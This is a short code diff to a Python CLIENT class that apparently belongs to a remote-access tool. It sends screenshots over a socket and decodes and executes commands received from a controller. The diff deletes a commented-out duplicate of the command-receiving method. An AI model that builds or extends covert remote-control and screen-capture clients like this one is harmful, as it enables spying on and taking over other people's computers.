@@ -84,23 +84,6 @@ class CLIENT:
 
             screenshot = SCREENSHOT()
             self.send_data(screenshot.get_data(), encode=False)
-    
-    # def acceptor(self):
-    #     data = ""
-    #     chunk = b""
-
-    #     while True:
-    #         chunk = self.SOCK.recv(4096)
-    #         if not chunk:
-    #             break
-    #         data += chunk.decode('utf-8')
-
-    #         if self.KEY.encode('utf-8') in chunk:
-    #             data = data.rstrip(self.KEY)
-    #             t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
-    #             t.daemon = True
-    #             t.start()
-    #             data = ""
 
     def acceptor(self):
         data = ""
